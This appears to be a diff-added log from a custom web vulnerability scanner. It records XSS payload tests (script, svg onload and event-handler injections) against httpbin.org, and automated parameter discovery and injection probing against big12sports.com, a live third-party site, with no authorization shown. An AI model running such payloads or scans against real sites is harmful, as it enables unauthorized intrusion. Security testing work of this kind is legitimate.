+2026-03-23 10:50:40,148 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 10:50:40,148 - VulnerabilityScanner - INFO - ⚠️  XSS verbose mode - testing with dangerous payloads
+2026-03-23 10:50:41,795 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: test
+2026-03-23 10:50:41,797 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-23 10:50:41,797 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: test
+2026-03-23 10:50:41,798 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=%26quot%3B%26gt%3B%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B
+2026-03-23 10:50:41,840 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: test
+2026-03-23 10:50:41,840 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=%26quot%3B%26gt%3B%26lt%3Bsvg+onload%3D%26quot%3Balert%281%29%26quot%3B%26gt%3B
+2026-03-23 10:50:41,868 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: test
+2026-03-23 10:50:41,868 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=%26quot%3B+oninput%3D%26quot%3Balert%281%29%26quot%3B+x%3D%26quot%3B
+2026-03-23 10:50:43,377 - VulnerabilityScanner - INFO - ⚠️  [REFLECTION] Found reflection vulnerability: test
+2026-03-23 10:50:43,378 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:43,473 - VulnerabilityScanner - INFO - ⚠️  [REFLECTION] Found reflection vulnerability: test
+2026-03-23 10:50:43,474 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:43,728 - VulnerabilityScanner - INFO - ⚠️  [REFLECTION] Found reflection vulnerability: test
+2026-03-23 10:50:43,728 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:43,799 - VulnerabilityScanner - INFO - ⚠️  [REFLECTION] Found reflection vulnerability: test
+2026-03-23 10:50:43,799 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:43,813 - VulnerabilityScanner - INFO - ⚠️  [REFLECTION] Found reflection vulnerability: test
+2026-03-23 10:50:43,813 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:44,002 - VulnerabilityScanner - INFO - ⚠️  [REFLECTION] Found reflection vulnerability: test
+2026-03-23 10:50:44,002 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:44,003 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-23 10:51:37,747 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/anything?existing=param
+2026-03-23 10:51:37,747 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 10:51:37,747 - VulnerabilityScanner - INFO - 📍 Using marker injection mode - testing for parameter reflection only
+2026-03-23 10:51:39,098 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: existing
+2026-03-23 10:51:39,098 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?existing=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:51:39,099 - VulnerabilityScanner - INFO - ✅ XSS marker injection scan complete
+2026-03-23 10:51:39,099 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/anything?existing=param
+2026-03-23 10:51:39,099 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 10:51:39,099 - VulnerabilityScanner - INFO - ⚠️  XSS verbose mode - testing with dangerous payloads
+2026-03-23 10:51:40,381 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: existing
+2026-03-23 10:51:40,381 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?existing=%26quot%3B%26gt%3B%26lt%3Bsvg+onload%3D%26quot%3Balert%281%29%26quot%3B%26gt%3B
+2026-03-23 10:51:40,409 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: existing
+2026-03-23 10:51:40,410 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?existing=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-23 10:51:40,472 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: existing
+2026-03-23 10:51:40,473 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?existing=%26quot%3B%26gt%3B%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B
+2026-03-23 10:51:40,517 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: existing
+2026-03-23 10:51:40,518 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?existing=%26quot%3B+oninput%3D%26quot%3Balert%281%29%26quot%3B+x%3D%26quot%3B
+2026-03-23 10:51:40,910 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: existing
+2026-03-23 10:51:40,910 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?existing=%26quot%3B+autofocus+onfocus%3D%26quot%3Balert%281%29%26quot%3B+x%3D%26quot%3B
+2026-03-23 10:51:41,670 - VulnerabilityScanner - INFO - ⚠️  [REFLECTION] Found reflection vulnerability: existing
+2026-03-23 10:51:41,670 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?existing=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:51:41,696 - VulnerabilityScanner - INFO - ⚠️  [REFLECTION] Found reflection vulnerability: existing
+2026-03-23 10:51:41,697 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?existing=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:51:41,788 - VulnerabilityScanner - INFO - ⚠️  [REFLECTION] Found reflection vulnerability: existing
+2026-03-23 10:51:41,788 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?existing=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:51:41,929 - VulnerabilityScanner - INFO - ⚠️  [REFLECTION] Found reflection vulnerability: existing
+2026-03-23 10:51:41,930 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?existing=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:51:41,985 - VulnerabilityScanner - INFO - ⚠️  [REFLECTION] Found reflection vulnerability: existing
+2026-03-23 10:51:41,986 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?existing=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:51:41,987 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-23 11:12:18,511 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/anything?existing=test
+2026-03-23 11:12:18,512 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/anything?param=value
+2026-03-23 11:12:18,512 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 11:12:18,512 - VulnerabilityScanner - INFO - 📍 Using marker injection mode - testing for parameter reflection only
+2026-03-23 11:12:19,933 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: param (tag_break)
+2026-03-23 11:12:19,933 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?param=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 11:12:19,934 - VulnerabilityScanner - INFO - ✅ XSS marker injection scan complete
+2026-03-23 11:12:30,669 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/anything?existing=test
+2026-03-23 11:12:30,670 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/anything?param=value
+2026-03-23 11:12:30,670 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 11:12:30,670 - VulnerabilityScanner - INFO - 📍 Using marker injection mode - testing for parameter reflection only
+2026-03-23 11:12:31,880 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: param (tag_break)
+2026-03-23 11:12:31,880 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?param=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 11:12:31,881 - VulnerabilityScanner - INFO - ✅ XSS marker injection scan complete
+2026-03-23 11:13:07,835 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com/schedule.aspx?amp&path=tennis&print=true&schedule=4848&xss=test
+2026-03-23 11:13:07,835 - VulnerabilityScanner - INFO - Testing 33 parameter(s)
+2026-03-23 11:13:07,835 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 11:13:07,835 - VulnerabilityScanner - INFO - 📍 Using marker injection mode - testing for parameter reflection only
+2026-03-23 11:13:11,669 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: filter (attribute_quote)
+2026-03-23 11:13:11,669 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&filter=%22+superman
+2026-03-23 11:13:11,892 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: tag (attribute_quote)
+2026-03-23 11:13:11,892 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&tag=%22+superman
+2026-03-23 11:13:11,896 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: page (attribute_quote)
+2026-03-23 11:13:11,896 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&page=%22+superman
+2026-03-23 11:13:12,166 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: user (attribute_quote)
+2026-03-23 11:13:12,167 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&user=%22+superman
+2026-03-23 11:13:12,219 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: debug (attribute_quote)
+2026-03-23 11:13:12,219 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&debug=%22+superman
+2026-03-23 11:13:12,358 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: value (attribute_quote)
+2026-03-23 11:13:12,358 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&value=%22+superman
+2026-03-23 11:13:12,591 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: category (attribute_quote)
+2026-03-23 11:13:12,591 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&category=%22+superman
+2026-03-23 11:13:12,639 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: payload (attribute_quote)
+2026-03-23 11:13:12,639 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&payload=%22+superman
+2026-03-23 11:13:12,773 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: callback (attribute_quote)
+2026-03-23 11:13:12,773 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&callback=%22+superman
+2026-03-23 11:13:15,605 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: url (attribute_quote)
+2026-03-23 11:13:15,605 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&url=%22+superman
+2026-03-23 11:13:15,876 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: email (attribute_quote)
+2026-03-23 11:13:15,876 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&email=%22+superman
+2026-03-23 11:13:15,906 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: xss (attribute_quote)
+2026-03-23 11:13:15,906 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=%22+superman
+2026-03-23 11:13:16,085 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: name (attribute_quote)
+2026-03-23 11:13:16,085 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&name=%22+superman
+2026-03-23 11:13:16,330 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: data (attribute_quote)
+2026-03-23 11:13:16,331 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&data=%22+superman
+2026-03-23 11:13:16,332 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: username (attribute_quote)
+2026-03-23 11:13:16,332 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&username=%22+superman
+2026-03-23 11:13:16,398 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: next (attribute_quote)
+2026-03-23 11:13:16,398 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&next=%22+superman
+2026-03-23 11:13:16,550 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: comment (attribute_quote)
+2026-03-23 11:13:16,550 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&comment=%22+superman
+2026-03-23 11:13:16,789 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: search (attribute_quote)
+2026-03-23 11:13:16,789 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&search=%22+superman
+2026-03-23 11:13:17,468 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: amp (attribute_quote)
+2026-03-23 11:13:17,468 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=%22+superman&path=tennis&print=true&schedule=4848&xss=test
+2026-03-23 11:13:19,792 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: type (attribute_quote)
+2026-03-23 11:13:19,792 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&type=%22+superman
+2026-03-23 11:13:19,802 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: test (attribute_quote)
+2026-03-23 11:13:19,802 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&test=%22+superman
+2026-03-23 11:13:20,394 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: return (attribute_quote)
+2026-03-23 11:13:20,394 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&return=%22+superman
+2026-03-23 11:13:20,420 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: redirect (attribute_quote)
+2026-03-23 11:13:20,420 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&redirect=%22+superman
+2026-03-23 11:13:20,458 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: keyword (attribute_quote)
+2026-03-23 11:13:20,458 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&keyword=%22+superman
+2026-03-23 11:13:20,836 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: schedule (attribute_quote)
+2026-03-23 11:13:20,837 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=%22+superman&xss=test
+2026-03-23 11:13:21,418 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: q (attribute_quote)
+2026-03-23 11:13:21,419 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&q=%22+superman
+2026-03-23 11:13:23,514 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: message (attribute_quote)
+2026-03-23 11:13:23,514 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&message=%22+superman
+2026-03-23 11:13:23,987 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: input (attribute_quote)
+2026-03-23 11:13:23,987 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&input=%22+superman
+2026-03-23 11:13:24,310 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: param (attribute_quote)
+2026-03-23 11:13:24,310 - VulnerabilityScanner - INFO -     URL: https://big12sports.com/schedule.aspx?amp=&path=tennis&print=true&schedule=4848&xss=test&param=%22+superman
+2026-03-23 11:13:24,311 - VulnerabilityScanner - INFO - ✅ XSS marker injection scan complete
+2026-03-23 11:13:24,312 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-23 11:26:05,899 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 11:26:05,899 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 11:26:05,899 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 11:26:05,899 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 11:26:05,899 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 11:28:25,120 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 11:28:25,120 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 11:28:25,120 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 11:28:25,120 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 11:28:25,120 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 11:36:25,626 - VulnerabilityScanner - INFO - ✅ Playwright discovered 13 parameters
+2026-03-23 11:39:25,940 - VulnerabilityScanner - INFO - ✅ Discovered 13 parameters: __VIEWSTATE, __VIEWSTATEGENERATOR, sidearm-calendar-select-school, videosSelect, sidearm-schedule-select-subscribe, path, target, sidearm-calendar-chooser-start-date, ad_id, sidearm-calendar-select-sport
+2026-03-23 11:39:25,940 - VulnerabilityScanner - INFO - ✓ Discovered 13 parameters from domain, testing 42 total with common defaults
+2026-03-23 11:39:25,940 - VulnerabilityScanner - INFO - Testing 42 parameter(s)
+2026-03-23 11:39:25,940 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 11:39:25,940 - VulnerabilityScanner - INFO - 📍 Using marker injection mode - testing for parameter reflection only
+2026-03-23 11:40:04,071 - VulnerabilityScanner - INFO - ✅ XSS marker injection scan complete
+2026-03-23 11:40:04,071 - VulnerabilityScanner - INFO - 🔍 [PATH-XSS] Starting path-based XSS scanning...
+2026-03-23 11:40:04,072 - VulnerabilityScanner - INFO - 🔍 [CUSTOM-PARAM] Starting custom parameter injection scanning...
+2026-03-23 11:40:46,488 - VulnerabilityScanner - INFO - ✅ Custom parameter injection scan complete
+2026-03-23 11:40:46,488 - VulnerabilityScanner - INFO - 🔍 [NUCLEI-ADVANCED] Starting advanced template scanning...
+2026-03-23 11:45:37,067 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 11:45:37,067 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 11:45:37,067 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 11:45:37,067 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 11:45:37,067 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 11:47:37,117 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 11:47:37,117 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 11:47:37,117 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 11:47:37,118 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 11:47:37,118 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 11:47:44,268 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 11:47:44,268 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 11:47:44,268 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 11:47:44,268 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 11:47:44,268 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 11:48:02,977 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 11:48:02,977 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 11:48:02,977 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 11:48:02,977 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 11:48:02,977 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 11:50:44,340 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 11:50:44,340 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 11:50:44,341 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 11:50:44,341 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 11:50:44,341 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 11:50:58,745 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 11:50:58,745 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 11:50:58,745 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 11:50:58,745 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 11:50:58,745 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 11:53:07,181 - VulnerabilityScanner - INFO - ✅ Discovered 13 unique parameters: ATCLID, partner, CURRENT_PAGE, CONTENT_ID, SPID, PALBID, zipcode, MONITOR_AD_ID, CAT_SPORT_ID, DB_LANG
+2026-03-23 11:53:07,181 - VulnerabilityScanner - INFO - ✅ Discovered 98 URLs with parameters
+2026-03-23 11:53:07,181 - VulnerabilityScanner - INFO - ✓ Discovered 13 parameters from domain, testing 42 total with common defaults
+2026-03-23 11:53:07,181 - VulnerabilityScanner - INFO - 🔗 Also testing 98 discovered URLs for XSS injection...
+2026-03-23 11:53:07,181 - VulnerabilityScanner - INFO - Testing 42 parameter(s)
+2026-03-23 11:53:07,181 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 11:53:07,181 - VulnerabilityScanner - INFO - 📍 Using marker injection mode - testing for parameter reflection only
+2026-03-23 11:54:00,865 - VulnerabilityScanner - INFO - ✅ XSS marker injection scan complete
+2026-03-23 11:54:00,865 - VulnerabilityScanner - INFO - 🔗 Testing 98 discovered URLs for parameter injection...
+2026-03-23 12:33:03,987 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 12:33:03,988 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 12:33:03,988 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 12:33:03,988 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 12:33:03,988 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 12:43:24,956 - VulnerabilityScanner - INFO - ✅ Playwright discovered 13 parameters
+2026-03-23 12:46:25,440 - VulnerabilityScanner - INFO - ✅ Discovered 13 unique parameters: sidearm-calendar-select-sport, __VIEWSTATE, path, target, searchInput, sidearm-calendar-chooser-start-date, __VIEWSTATEGENERATOR, sidearm-calendar-chooser-end-date, sidearm-calendar-select-school, ad_id
+2026-03-23 12:46:25,440 - VulnerabilityScanner - INFO - ✅ Discovered 8 URLs with parameters
+2026-03-23 12:46:25,440 - VulnerabilityScanner - INFO - ✓ Discovered 13 parameters from domain, testing 42 total with common defaults
+2026-03-23 12:46:25,440 - VulnerabilityScanner - INFO - 🔗 Also testing 8 discovered URLs for XSS injection...
+2026-03-23 12:46:25,440 - VulnerabilityScanner - INFO - Testing 42 parameter(s)
+2026-03-23 12:46:25,440 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 12:46:25,440 - VulnerabilityScanner - INFO - 📍 Using marker injection mode - testing for parameter reflection only
+2026-03-23 12:46:29,879 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: searchInput (attribute_close)
+2026-03-23 12:46:29,880 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?searchInput=superman%22%3E
+2026-03-23 12:46:29,950 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: q (attribute_close)
+2026-03-23 12:46:29,951 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?q=superman%22%3E
+2026-03-23 12:46:30,146 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: sidearm-calendar-select-sport (attribute_close)
+2026-03-23 12:46:30,146 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?sidearm-calendar-select-sport=superman%22%3E
+2026-03-23 12:46:30,205 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: email (attribute_quote)
+2026-03-23 12:46:30,205 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?email=%22+superman
+2026-03-23 12:46:30,211 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: username (attribute_quote)
+2026-03-23 12:46:30,212 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?username=%22+superman
+2026-03-23 12:46:30,255 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: input (attribute_close)
+2026-03-23 12:46:30,255 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?input=superman%22%3E
+2026-03-23 12:46:30,301 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: data (attribute_close)
+2026-03-23 12:46:30,301 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?data=superman%22%3E
+2026-03-23 12:46:31,687 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: name (single_quote)
+2026-03-23 12:46:31,687 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?name=%27+superman
+2026-03-23 12:46:31,715 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: keyword (single_quote)
+2026-03-23 12:46:31,715 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?keyword=%27+superman
+2026-03-23 12:46:32,030 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: __VIEWSTATE (single_quote)
+2026-03-23 12:46:32,030 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?__VIEWSTATE=%27+superman
+2026-03-23 12:46:33,487 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: videosSelect (attribute_quote)
+2026-03-23 12:46:33,487 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?videosSelect=%22+superman
+2026-03-23 12:46:33,610 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: callback (attribute_quote)
+2026-03-23 12:46:33,611 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?callback=%22+superman
+2026-03-23 12:46:33,670 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: param (attribute_quote)
+2026-03-23 12:46:33,670 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?param=%22+superman
